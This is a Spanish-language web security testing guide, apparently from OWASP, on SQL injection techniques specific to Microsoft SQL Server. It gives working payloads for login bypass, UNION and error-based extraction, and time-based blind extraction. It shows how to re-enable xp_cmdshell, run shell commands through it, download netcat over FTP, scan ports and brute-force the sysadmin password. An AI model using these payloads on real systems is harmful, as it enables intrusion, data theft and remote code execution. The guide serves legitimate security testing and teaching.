# Pruebas para SQL Server

## Resumen

En esta sección se discutirán algunas técnicas de [inyección SQL](https://owasp.org/www-community/attacks/SQL_Injection) que utilizan características específicas de Microsoft SQL Server.

Las vulnerabilidades de inyección SQL ocurren cuando la entrada se utiliza en la construcción de una consulta SQL sin ser adecuadamente restringida o sanitizada. El uso de SQL dinámico (la construcción de consultas SQL mediante concatenación de cadenas) abre la puerta a estas vulnerabilidades. La inyección SQL permite a un atacante acceder a los servidores SQL y ejecutar código SQL bajo los privilegios del usuario utilizado para conectarse a la base de datos.

Como se explica en [inyección SQL](https://owasp.org/www-community/attacks/SQL_Injection), un exploit de inyección SQL requiere dos cosas: un punto de entrada y un exploit para ingresar. Cualquier parámetro controlado por el usuario que sea procesado por la aplicación podría estar ocultando una vulnerabilidad. Esto incluye:

- Parámetros de aplicación en cadenas de consulta (por ejemplo, solicitudes GET)
- Parámetros de aplicación incluidos como parte del cuerpo de una solicitud POST
- Información relacionada con el navegador (por ejemplo, user-agent, referrer)
- Información relacionada con el host (por ejemplo, hostname, IP)
- Información relacionada con la sesión (por ejemplo, ID de usuario, cookies)

Microsoft SQL Server tiene algunas características únicas, por lo que algunos exploits necesitan ser especialmente personalizados para esta aplicación.

## Cómo probar

### Características de SQL Server

Para comenzar, veamos algunos operadores de SQL Server y comandos/procedimientos almacenados que son útiles en una prueba de inyección SQL:

- operador de comentario: `--` (útil para forzar a la consulta a ignorar la porción restante de la consulta original; esto no será necesario en todos los casos)
- separador de consulta: `;` (punto y coma)
- Procedimientos almacenados útiles incluyen:
    - [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) ejecuta cualquier shell de comandos en el servidor con los mismos permisos que está ejecutando actualmente. Por defecto, solo `sysadmin` puede usarlo y en SQL Server 2005 está deshabilitado por defecto (puede habilitarse nuevamente usando sp_configure)
    - `xp_regread` lee un valor arbitrario del Registro (procedimiento extendido no documentado)
    - `xp_regwrite` escribe un valor arbitrario en el Registro (procedimiento extendido no documentado)
    - [sp_makewebtask](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)) Genera un shell de comandos de Windows y pasa una cadena para ejecución. Cualquier salida se devuelve como filas de texto. Requiere privilegios de `sysadmin`.
    - [xp_sendmail](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)) Envía un mensaje de correo electrónico, que puede incluir un conjunto de resultados de consulta adjunto, a los destinatarios especificados. Este procedimiento almacenado extendido utiliza SQL Mail para enviar el mensaje.

Veamos ahora algunos ejemplos de ataques específicos de SQL Server que usan las funciones mencionadas anteriormente. La mayoría de estos ejemplos usarán la función `exec`.

A continuación mostramos cómo ejecutar un comando de shell que escribe la salida del comando `dir c:\inetpub` en un archivo navegable, asumiendo que el servidor web y el servidor de BD residen en el mismo host. La siguiente sintaxis usa `xp_cmdshell`:

`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`

Alternativamente, podemos usar `sp_makewebtask`:

`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`

Una ejecución exitosa creará un archivo que puede ser navegado por el probador de penetración. Ten en cuenta que `sp_makewebtask` está obsoleto, y, aunque funciona en todas las versiones de SQL Server hasta 2005, podría eliminarse en el futuro.

Además, las funciones integradas de SQL Server y las variables de entorno son muy útiles. Lo siguiente usa la función `db_name()` para activar un error que devolverá el nombre de la base de datos:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`

Observa el uso de [convert](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-2017):

`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`

`CONVERT` intentará convertir el resultado de `db_name` (una cadena) en una variable entera, activando un error, que, si se muestra por la aplicación vulnerable, contendrá el nombre de la BD.

El siguiente ejemplo usa la variable de entorno `@@version`, combinada con una inyección de estilo `union select`, para encontrar la versión del SQL Server.

`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`

Y aquí está el mismo ataque, pero usando nuevamente el truco de conversión:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`

La recopilación de información es útil para explotar vulnerabilidades de software en el SQL Server, a través de la explotación de un ataque de inyección SQL o acceso directo al listener de SQL.

A continuación, mostramos varios ejemplos que explotan vulnerabilidades de inyección SQL a través de diferentes puntos de entrada.

### Ejemplo 1: Pruebas de inyección SQL en una solicitud GET

El caso más simple (y a veces más gratificante) sería el de una página de inicio de sesión que solicita un nombre de usuario y contraseña para el inicio de sesión del usuario. Puedes intentar ingresar la siguiente cadena "' or '1'='1" (sin comillas dobles):

`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`

Si la aplicación está usando consultas SQL dinámicas, y la cadena se añade a la consulta de validación de credenciales del usuario, esto puede resultar en un inicio de sesión exitoso en la aplicación.

### Ejemplo 2: Pruebas de inyección SQL en una solicitud GET

Para aprender cuántas columnas existen

`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`

### Ejemplo 3: Pruebas en una solicitud POST

Inyección SQL, contenido HTTP POST: `email=%27&whichSubmit=submit&submit.x=0&submit.y=0`

Un ejemplo completo de post (`https://vulnerable.web.app/forgotpass.asp`):

```txt
POST /forgotpass.asp HTTP/1.1
Host: vulnerable.web.app
[...]
Referer: https://vulnerable.web.app/forgotpass.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=%27&whichSubmit=submit&submit.x=0&submit.y=0
```

El mensaje de error obtenido cuando se ingresa un carácter `'` (comilla simple) en el campo de correo electrónico es:

```txt
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark before the character string '' '.
/forgotpass.asp, line 15
```

### Ejemplo 4: Otro ejemplo (útil) de GET

Obteniendo el código fuente de la aplicación

`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`

### Ejemplo 5: `xp_cmdshell` personalizado

Todos los libros y artículos que describen las mejores prácticas de seguridad para SQL Server recomiendan deshabilitar `xp_cmdshell` en SQL Server 2000 (en SQL Server 2005 está deshabilitado por defecto). Sin embargo, si tenemos derechos de sysadmin (nativamente o forzando la contraseña de sysadmin, ver abajo), a menudo podemos eludir esta limitación.

En SQL Server 2000:

- Si `xp_cmdshell` ha sido deshabilitado con `sp_dropextendedproc`, podemos simplemente inyectar el siguiente código:

`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`

- Si el código anterior no funciona, significa que `xp_log70.dll` ha sido movido o eliminado. En este caso necesitamos inyectar el siguiente código:

```sql
CREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS
    DECLARE @result int, @OLEResult int, @RunResult int
    DECLARE @ShellID int
    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait
    IF @OLEResult <> 0 SELECT @result = @OLEResult
    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)
    EXECUTE @OLEResult = sp_OADestroy @ShellID
    return @result
```

Este código, escrito por Antonin Foller (ver enlaces al final de la página), crea un nuevo `xp_cmdshell` usando `sp_oacreate`, `sp_oamethod` y `sp_oadestroy` (siempre que no hayan sido deshabilitados también, por supuesto). Antes de usarlo, necesitamos eliminar el primer `xp_cmdshell` que creamos (incluso si no estaba funcionando), de lo contrario las dos declaraciones colisionarán.

En SQL Server 2005, `xp_cmdshell` puede habilitarse inyectando el siguiente código en su lugar:

```sql
master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure
```

### Ejemplo 6: Referer / User-Agent

El encabezado `REFERER` establecido en:

`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--`

Permite la ejecución de código SQL arbitrario. Lo mismo sucede con el encabezado User-Agent establecido en:

`User-Agent: user_agent', 'some_ip'); [SQL CODE]--`

### Ejemplo 7: SQL Server como escáner de puertos

En SQL Server, uno de los comandos más útiles (al menos para el probador de penetración) es OPENROWSET, que se usa para ejecutar una consulta en otro servidor de BD y recuperar los resultados. El probador de penetración puede usar este comando para escanear puertos de otras máquinas en la red objetivo, inyectando la siguiente consulta:

`select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--`

Esta consulta intentará una conexión a la dirección x.y.w.z en el puerto p. Si el puerto está cerrado, se devolverá el siguiente mensaje:

`SQL Server does not exist or access denied`

Por otro lado, si el puerto está abierto, se devolverá uno de los siguientes errores:

`General network error. Check your network documentation`

`OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.`

Por supuesto, el mensaje de error no siempre está disponible. Si ese es el caso, podemos usar el tiempo de respuesta para entender qué está pasando: con un puerto cerrado, el timeout (5 segundos en este ejemplo) se consumirá, mientras que un puerto abierto devolverá el resultado inmediatamente.

Ten en cuenta que OPENROWSET está habilitado por defecto en SQL Server 2000 pero deshabilitado en SQL Server 2005.

### Ejemplo 8: Carga de ejecutables

Una vez que podemos usar `xp_cmdshell` (ya sea el nativo o uno personalizado), podemos cargar fácilmente ejecutables en el servidor de BD objetivo. Una elección muy común es `netcat.exe`, pero cualquier troyano será útil aquí. Si el objetivo puede iniciar conexiones FTP a la máquina del probador, todo lo que se necesita es inyectar las siguientes consultas:

```sql
exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
```

En este punto, `nc.exe` será cargado y disponible.

Si FTP no está permitido por el firewall, tenemos una solución alternativa que explota el depurador de Windows, `debug.exe`, que está instalado por defecto en todas las máquinas Windows. `Debug.exe` es scriptable y es capaz de crear un ejecutable ejecutando un archivo de script apropiado. Lo que necesitamos hacer es convertir el ejecutable en un script de debug (que es un archivo 100% ASCII), cargarlo línea por línea y finalmente llamar a `debug.exe` en él. Hay varias herramientas que crean tales archivos de debug (ej.: `makescr.exe` por Ollie Whitehouse y `dbgtool.exe` por `toolcrypt.org`). Las consultas a inyectar serán por lo tanto las siguientes:

```sql
exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
```

En este punto, nuestro ejecutable está disponible en la máquina objetivo, listo para ser ejecutado. Hay herramientas que automatizan este proceso, notablemente `Bobcat`, que se ejecuta en Windows, y `Sqlninja`, que se ejecuta en Unix (Ver las herramientas al final de esta página).

### Obtener información cuando no se muestra (fuera de banda)

No todo está perdido cuando la aplicación web no devuelve ninguna información --como mensajes de error descriptivos (cf. [Inyección SQL ciega](https://owasp.org/www-community/attacks/Blind_SQL_Injection)). Por ejemplo, puede suceder que uno tenga acceso al código fuente (ej., porque la aplicación web se basa en software de código abierto). Entonces, el probador de penetración puede explotar todas las vulnerabilidades de inyección SQL descubiertas offline en la aplicación web. Aunque un IPS podría detener algunos de estos ataques, la mejor manera sería proceder de la siguiente manera: desarrollar y probar los ataques en un banco de pruebas creado para ese propósito, y luego ejecutar estos ataques contra la aplicación web que se está probando.

Otras opciones para ataques fuera de banda se describen en [Ejemplo 4 arriba](#example-4-yet-another-useful-get-example).

### Ataques de inyección SQL ciega

#### Prueba y error

Alternativamente, uno puede tener suerte. Es decir, el atacante puede asumir que hay una vulnerabilidad de inyección SQL ciega o fuera de banda en la aplicación web. Él seleccionará entonces un vector de ataque (ej., una entrada web), [usará vectores de fuzz](../../6-Appendix/C-Fuzz_Vectors.md) contra este canal y observará la respuesta. Por ejemplo, si la aplicación web está buscando un libro usando una consulta

```sql
select * from books where title="text entered by the user"
```

entonces el probador de penetración podría ingresar el texto: `'Bomba' OR 1=1-` y si los datos no se validan correctamente, la consulta pasará y devolverá la lista completa de libros. Esto es evidencia de que hay una vulnerabilidad de inyección SQL. El probador de penetración podría luego `jugar` con las consultas para evaluar la criticidad de esta vulnerabilidad.

> **_NOTA:_**  Ten cuidado al inyectar la condición OR 1=1 en una consulta SQL. Aunque esto puede ser inofensivo en el contexto inicial en el que estás inyectando, es común que las aplicaciones usen datos de una sola solicitud en múltiples consultas diferentes. Si tu condición llega a una declaración UPDATE o DELETE, por ejemplo, esto puede resultar en una pérdida accidental de datos.

#### Si se muestran múltiples mensajes de error

Por otro lado, si no hay información previa disponible, todavía hay una posibilidad de atacar explotando cualquier `canal encubierto`. Puede suceder que los mensajes de error descriptivos sean detenidos, sin embargo los mensajes de error dan alguna información. Por ejemplo:

- En algunos casos la aplicación web (en realidad el servidor web) podría devolver el tradicional `500: Internal Server Error`, digamos cuando la aplicación devuelve una excepción que podría generarse, por instancia, por una consulta con comillas sin cerrar.
- Mientras que en otros casos el servidor devolverá un mensaje `200 OK`, pero la aplicación web devolverá algún mensaje de error insertado por los desarrolladores `Internal server error` o `bad data`.

Este bit de información podría ser suficiente para entender cómo se construye la consulta SQL dinámica por la aplicación web y ajustar un exploit. Otro método fuera de banda es enviar los resultados a través de archivos navegables por HTTP.

#### Ataques de temporización

Hay una posibilidad más para hacer un ataque de inyección SQL ciega cuando no hay retroalimentación visible de la aplicación: midiendo el tiempo que la aplicación web toma para responder a una solicitud. Un ataque de este tipo es [descrito por Anley](https://web.archive.org/web/20160413052024/https://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf) de donde tomamos los siguientes ejemplos. Un enfoque típico usa el comando `waitfor delay`: digamos que el atacante quiere verificar si existe la base de datos de muestra `pubs`, simplemente inyectará el siguiente comando:

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

Dependiendo del tiempo que la consulta toma para devolver, sabremos la respuesta. De hecho, lo que tenemos aquí es dos cosas: una `vulnerabilidad de inyección SQL` y un `canal encubierto` que permite al probador de penetración obtener 1 bit de información por cada consulta. Por lo tanto, usando varias consultas (tantas consultas como bits en la información requerida) el probador de penetración puede obtener cualquier dato que esté en la base de datos. Mira la siguiente consulta

```sql
declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'
```

Midiendo el tiempo de respuesta y usando diferentes valores para `@i`, podemos deducir la longitud del nombre de la base de datos actual, y luego comenzar a extraer el nombre mismo con la siguiente consulta:

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`

Esta consulta esperará 5 segundos si el bit `@bit` del byte `@byte` del nombre de la base de datos actual es 1, y devolverá inmediatamente si es 0. Anidando dos ciclos (uno para `@byte` y uno para `@bit`) podremos extraer la pieza completa de información.

Sin embargo, puede suceder que el comando `waitfor` no esté disponible (ej., porque está filtrado por un IPS/firewall de aplicación web). Esto no significa que los ataques de inyección SQL ciega no puedan hacerse, ya que el probador de penetración solo debería idear cualquier operación que consuma tiempo que no esté filtrada. Por ejemplo

```sql
declare @i int select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end
```

#### Verificación de versión y vulnerabilidades

El mismo enfoque de temporización puede usarse también para entender con qué versión de SQL Server estamos tratando. Por supuesto aprovecharemos la variable integrada `@@version`. Considera la siguiente consulta:

`select @@version`

En SQL Server 2005, devolverá algo como lo siguiente:

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`

La parte `2005` de la cadena abarca del 22º al 25º carácter. Por lo tanto, una consulta a inyectar puede ser la siguiente:

`if substring((select @@version),25,1) = 5 waitfor delay '0:0:5'`

Tal consulta esperará 5 segundos si el 25º carácter de la variable `@@version` es `5`, mostrándonos que estamos tratando con un SQL Server 2005. Si la consulta devuelve inmediatamente, probablemente estamos tratando con SQL Server 2000, y otra consulta similar ayudará a aclarar todas las dudas.

### Ejemplo 9: Fuerza bruta de la contraseña de sysadmin

Para forzar la contraseña de sysadmin, podemos aprovechar el hecho de que `OPENROWSET` necesita credenciales apropiadas para realizar exitosamente la conexión y que tal conexión también puede "buclearse" al servidor de BD local. Combinando estas características con un ataque de inyección de inferencia basado en temporización de respuesta, podemos inyectar el siguiente código:

`select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')`

Lo que estamos haciendo aquí es intentar una conexión a la base de datos local (especificada por el campo vacío después de `SQLOLEDB`) usando `sa` y `<pwd>` como credenciales. Si la contraseña es correcta y la conexión es exitosa, la consulta se ejecuta, haciendo que la BD espere 5 segundos (y también devolviendo un valor, ya que OPENROWSET espera al menos una columna). Obteniendo las contraseñas candidatas de una lista de palabras y midiendo el tiempo necesario para cada conexión, podemos intentar adivinar la contraseña correcta. En "Data-mining with SQL Injection and Inference", David Litchfield lleva esta técnica aún más lejos, inyectando un fragmento de código para forzar la contraseña de sysadmin usando los recursos de CPU del servidor de BD mismo.

Una vez que tenemos la contraseña de sysadmin, tenemos dos opciones:

- Inyectar todas las consultas siguientes usando `OPENROWSET`, para usar privilegios de sysadmin
- Agregar nuestro usuario actual al grupo sysadmin usando `sp_addsrvrolemember`. El nombre de usuario actual puede extraerse usando inyección de inferencia contra la variable `system_user`.

Recuerda que OPENROWSET es accesible a todos los usuarios en SQL Server 2000 pero está restringido a cuentas administrativas en SQL Server 2005.

## Herramientas

- [Bernardo Damele A. G.: sqlmap, herramienta automática de inyección SQL](https://sqlmap.org/)

## Referencias

### Documentos técnicos

- [David Litchfield: "Data-mining with SQL Injection and Inference"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)
- [Chris Anley, "(more) Advanced SQL Injection"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)
- [Alexander Chigrik: "Useful undocumented extended stored procedures"](https://www.databasejournal.com/features/mssql/article.php/1441251/Useful-Undocumented-Extended-Stored-Procedures.htm)
- [Antonin Foller: "Custom xp_cmdshell, using shell object"](https://www.motobit.com/tips/detpg_cmdshell)
- [SQL Injection](https://www.cisecurity.org/wp-content/uploads/2017/05/SQL-Injection-White-Paper.pdf)
- [Cesar Cerrudo: Manipulating Microsoft SQL Server Using SQL Injection, uploading files, getting into internal network, port scanning, DOS](https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf)